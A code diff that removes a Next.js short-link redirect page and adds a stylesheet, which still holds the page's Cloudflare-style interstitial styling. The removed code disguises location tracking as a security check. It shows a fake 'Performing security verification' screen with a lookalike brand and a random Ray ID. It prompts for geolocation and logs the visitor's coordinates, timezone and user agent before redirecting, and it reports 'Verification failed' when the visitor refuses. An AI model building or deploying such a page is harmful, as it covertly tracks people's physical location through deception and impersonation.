@@ -1,302 +1,227 @@
-"use client";
+* { box-sizing: border-box; margin: 0; padding: 0; }
 
-import { useCallback, useEffect, useRef, useState } from "react";
-import { useParams } from "next/navigation";
-import { supabase } from "../../lib/supabaseClient";
-
-export default function RedirectPage() {
-  const { code } = useParams();
-  // resolving | ready | locating | blocked | redirecting | notfound | unsupported
-  const [status, setStatus] = useState("resolving");
-  const [link, setLink] = useState(null); // { url_id, destination_url }
-  const [errorMsg, setErrorMsg] = useState("");
-  const startedRef = useRef(false);
-
-  // Presentational only (Cloudflare-style look): hostname, ray id, tab title
-  const [hostname, setHostname] = useState("");
-  const [rayId, setRayId] = useState("");
-
-  useEffect(() => {
-    setHostname(window.location.hostname);
-    const bytes = new Uint8Array(8);
-    crypto.getRandomValues(bytes);
-    setRayId(
-      Array.from(bytes)
-        .map((b) => b.toString(16).padStart(2, "0"))
-        .join("")
-    );
-    document.title = "Just a moment...";
-  }, []);
-
-  const requestLocation = useCallback((urlId, destUrl) => {
-    if (!("geolocation" in navigator)) {
-      setStatus("unsupported");
-      return;
-    }
-    setStatus("locating");
-
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const { latitude, longitude, accuracy } = position.coords;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-        try {
-          // invoke() does NOT throw on HTTP errors: it returns { error }
-          const { error } = await supabase.functions.invoke("log-visit", {
-            body: {
-              url_id: urlId,
-              latitude,
-              longitude,
-              accuracy,
-              timezone,
-              user_agent: navigator.userAgent,
-            },
-          });
-          if (error) console.error("log-visit failed:", error);
-        } catch (e) {
-          // Logging failed: still redirect so the visitor isn't stuck
-          console.error("Failed to log visit:", e);
-        }
-
-        setStatus("redirecting");
-        window.location.replace(destUrl);
-      },
-      (err) => {
-        console.warn("Geolocation error:", err.code, err.message);
-        setStatus("blocked");
-      },
-      { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
-    );
-  }, []);
-
-  useEffect(() => {
-    if (!code || startedRef.current) return;
-    startedRef.current = true;
-
-    (async () => {
-      try {
-        const res = await fetch(`/api/resolve?code=${encodeURIComponent(code)}`);
-        const json = await res.json();
-        if (!res.ok) throw new Error(json.error || "Failed to resolve this link.");
-        setLink(json);
-        setStatus("ready");
-        // Automatically trigger the browser's location prompt
-        requestLocation(json.url_id, json.destination_url);
-      } catch (e) {
-        setErrorMsg(e.message);
-        setStatus("notfound");
-      }
-    })();
-  }, [code, requestLocation]);
-
-  if (status === "notfound") {
-    return (
-      <CfShell hostname={hostname} rayId={rayId}>
-        <div className="cf-box">
-          <h2>Link not found</h2>
-          <p className="cf-sub" style={{ marginTop: 8 }}>
-            {errorMsg || "This short link does not exist."}
-          </p>
-        </div>
-      </CfShell>
-    );
-  }
-
-  if (status === "blocked" || status === "unsupported") {
-    return (
-      <CfShell hostname={hostname} rayId={rayId}>
-        <h2 className="cf-h2 cf-error-text">Verification failed</h2>
-        <p className="cf-sub">
-          Verification could not be completed. Please try again.
-        </p>
-        <Widget
-          state="failed"
-          onRetry={() => requestLocation(link.url_id, link.destination_url)}
-        />
-      </CfShell>
-    );
-  }
-
-  if (status === "redirecting") {
-    return (
-      <CfShell hostname={hostname} rayId={rayId}>
-        <h2 className="cf-h2">
-          Verification successful. Waiting for {hostname || "the site"} to respond
-        </h2>
-        <Widget state="success" />
-      </CfShell>
-    );
-  }
-
-  // resolving | ready | locating
-  return (
-    <CfShell hostname={hostname} rayId={rayId}>
-      <h2 className="cf-h2">Performing security verification...</h2>
-      <p className="cf-sub">
-        This page is performing a security check before you continue.
-      </p>
-      <Widget state={status === "locating" ? "verifying" : "check"} />
-    </CfShell>
-  );
+body {
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  background: #f4f5f7;
+  color: #111827;
+  min-height: 100vh;
 }
 
-/* ---------- presentational components (no logic) ---------- */
+a { color: #2563eb; text-decoration: none; }
+a:hover { text-decoration: underline; }
 
-function CfShell({ hostname, rayId, children }) {
-  return (
-    <div className="cf-wrapper">
-      <div className="cf-main">
-        <div className="cf-title-row">
-          <h1>{hostname}</h1>
-        </div>
-        {children}
-      </div>
-      <footer className="cf-footer">
-        <div className="cf-footer-inner">
-          <div className="cf-footer-wrapper">
-            <div>
-              <div className="cf-ray">
-                Ray ID: <code>{rayId}</code>
-              </div>
-            </div>
-            <div className="cf-footer-links">
-              <span className="cf-footer-text">
-                Performance and Security by{" "}
-                <a
-                  rel="noopener noreferrer"
-                  href="https://www.vigil.com/?utm_source=challenge&utm_campaign=m"
-                  target="_blank"
-                  aria-label="vigil, opens in a new tab"
-                >
-                  vigil
-                </a>
-              </span>
-              <span className="cf-footer-divider"></span>
-              <a
-                target="_blank"
-                rel="noopener noreferrer"
-                href="https://www.vigil.com/privacypolicy/"
-                aria-label="Privacy, opens in a new tab"
-                className="cf-footer-text"
-              >
-                Privacy
-              </a>
-            </div>
-          </div>
-        </div>
-      </footer>
-    </div>
-  );
+.nav {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 14px 24px; background: #fff; border-bottom: 1px solid #e5e7eb;
+}
+.nav-brand { font-weight: 700; font-size: 18px; color: #111827; }
+.nav-brand:hover { text-decoration: none; }
+.nav-links { display: flex; gap: 16px; align-items: center; }
+.btn-link {
+  background: none; border: none; color: #2563eb;
+  cursor: pointer; font-size: 15px; padding: 0;
+}
+.btn-link:hover { text-decoration: underline; }
+
+.container { max-width: 1000px; margin: 32px auto; padding: 0 16px; }
+
+.card {
+  background: #fff; border: 1px solid #e5e7eb;
+  border-radius: 10px; padding: 24px; margin-bottom: 24px;
 }
 
-// Original VIGIL logo: location-pin mark + wordmark (73x25, same slot)
-function VigilLogo() {
-  return (
-    <svg
-      className="cf-logo-svg"
-      viewBox="0 0 73 25"
-      role="img"
-      aria-label="vigil"
-      xmlns="http://www.w3.org/2000/svg"
-    >
-      <path
-        className="cf-logo-pin"
-        fillRule="evenodd"
-        d="M12 1.5C7.9 1.5 4.5 4.9 4.5 9c0 5.6 7.5 13.5 7.5 13.5S19.5 14.6 19.5 9c0-4.1-3.4-7.5-7.5-7.5zm0 4.8a2.7 2.7 0 110 5.4 2.7 2.7 0 010-5.4z"
-      />
-      <text className="cf-logo-text" x="25" y="17.5">
-        VIGIL
-      </text>
-    </svg>
-  );
+h1 { font-size: 22px; margin-bottom: 8px; }
+h2 { font-size: 18px; margin-bottom: 12px; }
+
+.shorten-form { display: flex; gap: 10px; margin-top: 16px; }
+.shorten-form input, .auth-form input {
+  padding: 10px 12px; border: 1px solid #d1d5db;
+  border-radius: 8px; font-size: 15px;
+}
+.shorten-form input { flex: 1; }
+
+.btn {
+  display: inline-block; padding: 10px 18px; background: #2563eb;
+  color: #fff; border: none; border-radius: 8px;
+  font-size: 15px; cursor: pointer;
+}
+.btn:hover { background: #1d4ed8; text-decoration: none; }
+.btn:disabled { background: #93c5fd; cursor: not-allowed; }
+.btn-secondary { background: #6b7280; }
+.btn-secondary:hover { background: #4b5563; }
+
+.error { color: #dc2626; margin-top: 12px; font-size: 14px; }
+.hint { color: #6b7280; font-size: 13px; margin-top: 12px; }
+
+.result { margin-top: 16px; padding: 14px; background: #eff6ff; border-radius: 8px; }
+.result-row { display: flex; gap: 10px; align-items: center; margin-top: 6px; flex-wrap: wrap; }
+
+.auth-form { display: flex; flex-direction: column; gap: 12px; max-width: 380px; margin-top: 16px; }
+
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; font-size: 14px; }
+th, td { padding: 8px 10px; border-bottom: 1px solid #e5e7eb; text-align: left; white-space: nowrap; }
+th { background: #f9fafb; font-weight: 600; }
+td.truncate { max-width: 220px; overflow: hidden; text-overflow: ellipsis; }
+
+.center-screen {
+  min-height: 70vh; display: flex; align-items: center;
+  justify-content: center; text-align: center; padding: 24px;
+}
+.block-box {
+  background: #fff; border: 1px solid #e5e7eb;
+  border-radius: 12px; padding: 32px; max-width: 460px;
 }
 
-// states: check | verifying | success | failed
-function Widget({ state, onRetry }) {
-  return (
-    <div className="cf-widget" aria-live="polite">
-      <div className="cf-widget-state">
-        {state === "check" && (
-          <>
-            <span className="cf-checkbox" aria-hidden="true"></span>
-            <span className="cf-state-label">Verify you are human</span>
-          </>
-        )}
+/* ==========================================================
+   Cloudflare-style interstitial  (used by app/[code]/page.js)
+   ========================================================== */
 
-        {state === "verifying" && (
-          <>
-            <svg className="cf-rays" viewBox="0 0 30 30" aria-hidden="true">
-              <line x1="15" y1="1.5" x2="15" y2="6" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(45 15 15)" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(90 15 15)" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(135 15 15)" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(180 15 15)" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(225 15 15)" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(270 15 15)" />
-              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(315 15 15)" />
-            </svg>
-            <span className="cf-state-label">Verifying...</span>
-          </>
-        )}
-
-        {state === "success" && (
-          <>
-            <svg className="cf-state-icon" viewBox="0 0 30 30" aria-hidden="true">
-              <circle className="cf-ring-green" cx="15" cy="15" r="13.5" />
-              <circle className="cf-dot-green" cx="1.5" cy="15" r="1.65" />
-              <circle className="cf-dot-green" cx="28.5" cy="15" r="1.3" />
-              <circle className="cf-badge-green" cx="15" cy="15" r="11" />
-              <path className="cf-check-white" d="M9.8 15.6 L13.6 19.2 L20.6 11.4" />
-            </svg>
-            <span className="cf-state-label">Success!</span>
-          </>
-        )}
-
-        {state === "failed" && (
-          <>
-            <svg className="cf-state-icon" viewBox="0 0 30 30" aria-hidden="true">
-              <circle className="cf-ring-red" cx="15" cy="15" r="13.5" />
-              <circle className="cf-dot-red" cx="1.5" cy="15" r="1.65" />
-              <circle className="cf-dot-red" cx="28.5" cy="15" r="1.3" />
-              <circle className="cf-badge-red" cx="15" cy="15" r="11" />
-              <line className="cf-excl" x1="15" y1="9" x2="15" y2="16.5" />
-              <circle className="cf-excl-dot" cx="15" cy="19.4" r="1.5" />
-            </svg>
-            <span className="cf-state-label cf-state-failed">
-              Verification failed
-              <a
-                href="#retry"
-                onClick={(e) => {
-                  e.preventDefault();
-                  onRetry();
-                }}
-              >
-                Troubleshoot
-              </a>
-            </span>
-          </>
-        )}
-      </div>
-
-      <div className="cf-widget-side">
-        <a
-          className="cf-widget-logo"
-          href="https://www.vigil.com/?utm_source=challenge&utm_campaign=widget"
-          target="_blank"
-          rel="noopener noreferrer"
-          aria-label="vigil, opens in a new tab"
-        >
-          <VigilLogo />
-        </a>
-        <a
-          className="cf-widget-privacy"
-          href="https://www.vigil.com/privacypolicy/"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Privacy
-        </a>
-      </div>
-    </div>
-  );
+.cf-wrapper {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  background: #fff;
 }
+
+.cf-main {
+  width: 100%;
+  max-width: 60rem;
+  margin: 0 auto;
+  padding: 6rem 2rem 2rem;
+}
+
+.cf-title-row { display: flex; align-items: center; gap: 0.5rem; }
+.cf-title-row h1 {
+  font-size: 2.5rem;
+  font-weight: 600;
+  line-height: 125%;
+  color: #313131;
+  margin-bottom: 0;
+}
+
+.cf-h2 {
+  font-size: 1.5rem;
+  font-weight: 600;
+  color: #313131;
+  margin: 2rem 0 0.5rem;
+}
+.cf-sub {
+  color: #595959;
+  font-weight: 300;
+  line-height: 150%;
+  margin-bottom: 2rem;
+}
+.cf-error-text { color: #b20f03; }
+
+/* ---------- verification widget ---------- */
+.cf-widget {
+  display: flex; align-items: center; justify-content: space-between; gap: 10px;
+  width: 300px; min-height: 65px;
+  border: 1px solid #d9d9d9; border-radius: 2px;
+  background: #f8f8f8;
+  padding: 8px 10px 8px 14px;
+  user-select: none;
+}
+.cf-widget-state { display: flex; align-items: center; gap: 12px; min-width: 0; }
+.cf-state-label { font-size: 14px; color: #232323; }
+
+/* checkbox (decorative) */
+.cf-checkbox {
+  display: inline-block; width: 24px; height: 24px; flex: none;
+  border: 2px solid #4a4a4a; border-radius: 3px; background: #fff;
+  animation: cf-check-pulse 2.2s ease-in-out infinite;
+}
+@keyframes cf-check-pulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(0, 81, 195, 0); }
+  50% { box-shadow: 0 0 0 5px rgba(0, 81, 195, 0.15); }
+}
+
+/* spinning rays */
+.cf-rays { width: 30px; height: 30px; flex: none; animation: cf-spin 1s steps(8) infinite; }
+.cf-rays line { stroke: #595959; stroke-width: 2.4; stroke-linecap: round; }
+@keyframes cf-spin { to { transform: rotate(360deg); } }
+
+/* success / failure icons */
+.cf-state-icon { width: 30px; height: 30px; flex: none; }
+.cf-ring-green { fill: none; stroke: #228b49; stroke-width: 1; opacity: 0.3; }
+.cf-dot-green { fill: #228b49; }
+.cf-badge-green {
+  fill: #228b49; transform-origin: center;
+  animation: cf-pop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+}
+.cf-check-white {
+  fill: none; stroke: #fff; stroke-width: 3;
+  stroke-linecap: round; stroke-linejoin: round;
+  stroke-dasharray: 24; stroke-dashoffset: 24;
+  animation: cf-dash 0.3s 0.2s ease-out forwards;
+}
+.cf-ring-red { fill: none; stroke: #b20f03; stroke-width: 1; opacity: 0.3; }
+.cf-dot-red { fill: #b20f03; }
+.cf-badge-red { fill: #b20f03; transform-origin: center; animation: cf-pop 0.3s both; }
+.cf-excl { stroke: #fff; stroke-width: 2.4; stroke-linecap: round; }
+.cf-excl-dot { fill: #fff; }
+
+@keyframes cf-pop {
+  from { transform: scale(0.4); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+@keyframes cf-dash { to { stroke-dashoffset: 0; } }
+
+/* failed text + troubleshoot link */
+.cf-state-failed { display: flex; flex-direction: column; line-height: 1.35; }
+.cf-state-failed a {
+  font-size: 10px; color: #232323;
+  text-decoration: underline; cursor: pointer;
+}
+.cf-state-failed a:hover { color: #003681; }
+
+/* brand column inside widget */
+.cf-widget-side {
+  display: flex; flex-direction: column; align-items: flex-end;
+  gap: 4px; flex: none;
+}
+.cf-widget-logo {
+  display: inline-flex; align-items: center; text-decoration: none;
+}
+.cf-widget-privacy { font-size: 9px; color: #8a8a8a; text-decoration: none; }
+.cf-widget-privacy:hover { text-decoration: underline; }
+
+/* blocked content box (Link not found) */
+.cf-box {
+  background: #fff; border: 1px solid #d9d9d9; border-radius: 8px;
+  padding: 20px; margin-top: 2rem; max-width: 460px;
+}
+
+/* footer */
+.cf-footer {
+  margin-top: auto;
+  width: 100%; max-width: 60rem;
+  margin-left: auto; margin-right: auto;
+  padding: 1rem 2rem 1.5rem;
+}
+.cf-footer-inner {
+  display: flex; align-items: center; justify-content: center;
+  gap: 12px; flex-wrap: wrap;
+  border-top: 1px solid #d9d9d9;
+  padding-top: 1rem;
+  font-size: 12px; color: #595959;
+}
+.cf-footer code { font-family: monospace; font-size: 12px; color: #313131; }
+.cf-footer-divider { width: 1px; height: 12px; background: #d9d9d9; }
+
+/* dark mode */
+@media (prefers-color-scheme: dark) {
+  .cf-wrapper { background: #313131; }
+  .cf-title-row h1, .cf-h2 { color: #f2f2f2; }
+  .cf-sub { color: #b6b6b6; }
+  .cf-widget { background: #222; border-color: #4a4a4a; }
+  .cf-state-label { color: #f2f2f2; }
+  .cf-checkbox { background: #0a0a0a; border-color: #9a9a9a; }
+  .cf-rays line { stroke: #b6b6b6; }
+  .cf-ring-green { stroke: #2db35e; }
+  .cf-dot-green { fill: #2db35e; }
+  .cf-badge-green { fill: #2db35e; }
+  .cf-ring-red { stroke: #fc574a; }
+  .cf-dot-red { fill: #fc574a; }
+  .cf-badge-red {
